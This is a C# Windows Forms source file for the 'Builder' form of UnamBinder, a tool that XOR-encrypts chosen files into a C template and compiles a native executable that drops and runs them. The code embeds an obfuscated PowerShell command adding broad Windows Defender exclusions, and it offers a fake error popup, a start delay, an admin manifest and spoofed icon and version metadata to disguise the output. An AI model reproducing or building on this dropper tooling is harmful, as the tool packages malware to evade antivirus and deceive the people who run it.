using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace UnamBinder
{
    public partial class Builder : Form
    {
        private static Random random = new Random();
        public Vanity vanity = new Vanity();
        private string key = RandomString(32);

        public static int MAX_PATH = 255;

        public Builder()
        {
            InitializeComponent();
        }

        public void NativeCompiler(string savePath)
        {
            try
            {
                btnBuild.Text = "Building...";
                btnBuild.Enabled = false;
                key = RandomString(32);

                string currentDirectory = Path.GetDirectoryName(savePath);
                string filename = Path.GetFileNameWithoutExtension(savePath);

                Dictionary<string, string> paths = new Dictionary<string, string>(){
                    { "current", currentDirectory },
                    { "compiler", Path.Combine(currentDirectory, "Compiler") },
                    { "compilerlog", Path.Combine(currentDirectory, "Compiler\\logs") },
                    { "windres", Path.Combine(currentDirectory, "Compiler\\MinGW64\\bin\\windres.exe") },
                    { "tcc", Path.Combine(currentDirectory, "Compiler\\tinycc\\tcc.exe") },
                    { "windreslog", Path.Combine(currentDirectory, "Compiler\\logs\\windres.log") },
                    { "tcclog", Path.Combine(currentDirectory, "Compiler\\logs\\tcc.log") },
                    { "manifest", Path.Combine(currentDirectory, "administrator.manifest") },
                    { "resource.rc", Path.Combine(currentDirectory, "resource.rc") },
                    { "resource.o", Path.Combine(currentDirectory, "resource.o") },
                    { "filename", Path.Combine(currentDirectory, filename) }
                };

                char[] directoryFilter = CheckNonASCII(savePath);

                if (BuildErrorTest(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter)))) return;

                if (BuildErrorTest(checkDelay.Checked && !txtDelay.Text.All(char.IsDigit), "Error: Start Delay must be a number.")) return;

                if (!Directory.Exists(paths["compiler"]))
                {
                    Directory.CreateDirectory(paths["compilerlog"]);
                    using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.tinycc)))
                    {
                        archive.ExtractToDirectory(paths["compiler"]);
                    }
                    using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.MinGW64)))
                    {
                        archive.ExtractToDirectory(paths["compiler"]);
                    }
                }

                StringBuilder sb = new StringBuilder(Properties.Resources.Program1);

                bool buildResource = (checkAdmin.Checked || vanity.checkIcon.Checked || vanity.checkAssembly.Checked);

                if (buildResource)
                {
                    StringBuilder resource = new StringBuilder(Properties.Resources.resource);
                    string defs = "";
                    if (vanity.checkIcon.Checked)
                    {
                        resource.Replace("#ICON", vanity.txtIconPath.Text);
                        defs += " -DDefIcon";
                    }
                    if (checkAdmin.Checked)
                    {
                        System.IO.File.WriteAllBytes(paths["manifest"], Properties.Resources.administrator);
                        defs += " -DDefAdmin";
                    }
                    if (vanity.checkAssembly.Checked)
                    {
                        resource.Replace("#TITLE", vanity.txtAssemblyTitle.Text);
                        resource.Replace("#DESCRIPTION", vanity.txtAssemblyDescription.Text);
                        resource.Replace("#COMPANY", vanity.txtAssemblyCompany.Text);
                        resource.Replace("#PRODUCT", vanity.txtAssemblyProduct.Text);
                        resource.Replace("#COPYRIGHT", vanity.txtAssemblyCopyright.Text);
                        resource.Replace("#TRADEMARK", vanity.txtAssemblyTrademark.Text);
                        resource.Replace("#VERSION", string.Join(",", new string[] { vanity.txtAssemblyVersion1.Text, vanity.txtAssemblyVersion2.Text, vanity.txtAssemblyVersion3.Text, vanity.txtAssemblyVersion4.Text }));
                        defs += " -DDefAssembly";
                    }

                    System.IO.File.WriteAllText(paths["resource.rc"], resource.ToString());
                    RunExternalProgram(
                        "cmd",
                        string.Format("cmd /c \"{0}\" --input resource.rc --output resource.o -O coff -F pe-i386 {1}", paths["windres"], defs),
                        currentDirectory,
                        paths["windreslog"]
                    );
                    System.IO.File.Delete(paths["resource.rc"]);
                    System.IO.File.Delete(paths["manifest"]);

                    if (BuildErrorTest(!System.IO.File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"]))) return;
                }

                List<string> stringarray = new List<string>();
                List<string> intarray = new List<string>();

                int count = listFiles.Items.Count;
                for (int i = 0; i < count; i++)
                {
                    File filevar = (File)listFiles.Items[i];
                    try
                    {
                        byte[] filebytes = System.IO.File.ReadAllBytes(filevar.txtBindfile.Text);
                        stringarray.Add("{\"" + filevar.comboDropLocation.Text + "\",\"" + ToLiteral(Cipher(filevar.txtFilename.Text, key)) + "\",\"" + ToLiteral(CipherBytes(filebytes, key)) + "\"}");
                        intarray.Add("{" + filevar.txtFilename.Text.Length + "," + (filevar.toggleExecute.Checked ? "1" : "0") + "," + filebytes.Length + "}");
                    }
                    catch
                    {
                        if (BuildErrorTest(true, "Error: Could not read the file: " + filevar.txtBindfile.Text + ", make sure that the file exists and that the path is correct.")) return;
                    }
                }

                sb.Replace("#ARRAYCOUNT", count.ToString());
                sb.Replace("#STRINGARRAY", string.Join(",", stringarray));
                sb.Replace("#INTARRAY", string.Join(",", intarray));
                sb.Replace("#KEY", key);

                CipherReplace(sb, "#COMMANDRUN", "cmd /c start ");

                if (checkWD.Checked)
                {
                    sb.Replace("DefWD", "TRUE");
                    CipherReplace(sb, "#WDCOMMAND", "cmd /c powershell -Command \"Add-MpPreference -ExclusionPath @($env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force\" & powershell -Command \"Add-MpPreference -ExclusionExtension @('exe','dll') -Force\" & exit");
                }

                if (checkDelay.Checked)
                {
                    sb.Replace("DefDelay", "TRUE");
                    sb.Replace("#DELAY", txtDelay.Text);
                }

                if (checkError.Checked)
                {
                    sb.Replace("DefError", "TRUE");
                    CipherReplace(sb, "#ERRORCOMMAND", "cmd /c powershell -Command \"Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('" + txtError.Text.Replace("'", "''") + "','Error','OK','Error')\"");
                }

                System.IO.File.WriteAllText(paths["filename"] + ".c", sb.ToString(), Encoding.GetEncoding("ISO-8859-1"));
                RunExternalProgram(
                    paths["tcc"], 
                    string.Format("-Wall -Wl,-subsystem=windows \"{0}\" {1} -luser32 -m32", paths["filename"] + ".c", buildResource ? "resource.o" : ""), 
                    currentDirectory, 
                    paths["tcclog"]
                );
                System.IO.File.Delete(paths["resource.o"]);
                System.IO.File.Delete(paths["filename"] + ".c");

                if (BuildErrorTest(!System.IO.File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["tcclog"]))) return;
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: An error occured while building the file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            btnBuild.Enabled = true;
            btnBuild.Text = "Build";
        }

        public void RunExternalProgram(string filename, string arguments, string workingDirectory, string logpath)
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = filename;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.WorkingDirectory = workingDirectory;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardError = true;
                process.Start();

                using (StreamWriter writer = System.IO.File.AppendText(logpath))
                {
                    writer.Write(process.StandardError.ReadToEnd());
                }
                process.WaitForExit();
            }
        }

        public bool BuildErrorTest(bool condition, string message)
        {
            if (condition)
            {
                MessageBox.Show(message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                btnBuild.Enabled = true;
                btnBuild.Text = "Build";
                return true;
            }
            return false;
        }

        public void CipherReplace(StringBuilder source, string id, string value)
        {
            source.Replace(id + "LENGTH", value.Length.ToString());
            source.Replace(id, ToLiteral(Cipher(value, key)));
        }

        public static string RandomString(int length)
        {
            const string chars = "abcdefghijklmnpqrstuvwxyz0123456789!$&()*+,-./:<=>@[]^_";
            const int clength = 55;
            var buffer = new char[length];
            for (var i = 0; i < length; ++i)
            {
                buffer[i] = chars[random.Next(clength)];
            }
            return new string(buffer);
        }

        public string Cipher(string data, string key)
        {
            var result = new char[data.Length];
            for (int c = 0; c < data.Length; c++)
                result[c] = (char)((uint)data[c] ^ key[c % key.Length]);
            return string.Join("", result);
        }

        public string CipherBytes(byte[] data, string key)
        {
            var result = new char[data.Length];
            for (int c = 0; c < data.Length; c++)
                result[c] = (char)((uint)data[c] ^ key[c % key.Length]);
            return string.Join("", result);
        }

        private static string ToLiteral(string input)
        {
            var literal = new StringBuilder(input.Length + 2);
            foreach (var c in input)
            {
                switch (c)
                {
                    case '\"': literal.Append("\\\""); break;
                    case '\\': literal.Append(@"\\"); break;
                    case '\0': literal.Append(@"\u0000"); break;
                    case '\a': literal.Append(@"\a"); break;
                    case '\b': literal.Append(@"\b"); break;
                    case '\f': literal.Append(@"\f"); break;
                    case '\n': literal.Append(@"\n"); break;
                    case '\r': literal.Append(@"\r"); break;
                    case '\t': literal.Append(@"\t"); break;
                    case '\v': literal.Append(@"\v"); break;
                    default:
                        literal.Append(c);
                        break;
                }
            }
            return literal.ToString();
        }

        public static char[] CheckNonASCII(string text)
        {
            return text.Where(c => c > 127).ToArray();
        }

        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = filter;
            dialog.InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        private void btnAdd_Click(object sender, EventArgs e)
        {
            File add = new File();
            add.builder = this;
            add.Show();
            listFiles.Items.Add(add);
        }

        private void btnEdit_Click(object sender, EventArgs e)
        {
            if (listFiles.SelectedItem != null)
            {
                ((File)listFiles.SelectedItem).Show();
            }
        }

        private void btnRemove_Click(object sender, EventArgs e)
        {
            if (listFiles.SelectedItem != null)
            {
                ((File)listFiles.SelectedItem).Hide();
                listFiles.Items.Remove(listFiles.SelectedItem);
            }
        }

        private void linkGitHub_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/UnamSanctam/UnamBinder");
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (listFiles.Items.Count == 0)
            {
                MessageBox.Show("You need to add at least one file to bind before building.", "Incorrect build!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            string save = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");

            if (save.Length > 0)
            {
                NativeCompiler(save);
            }
        }

        private void btnVanity_Click(object sender, EventArgs e)
        {
            vanity.Show();
        }

        private void checkError_CheckedChanged(object sender)
        {
            txtError.Visible = checkError.Checked;
        }

        private void checkDelay_CheckedChanged(object sender)
        {
            txtDelay.Visible = checkDelay.Checked;
            labelDelay.Visible = checkDelay.Checked;
        }
    }
}
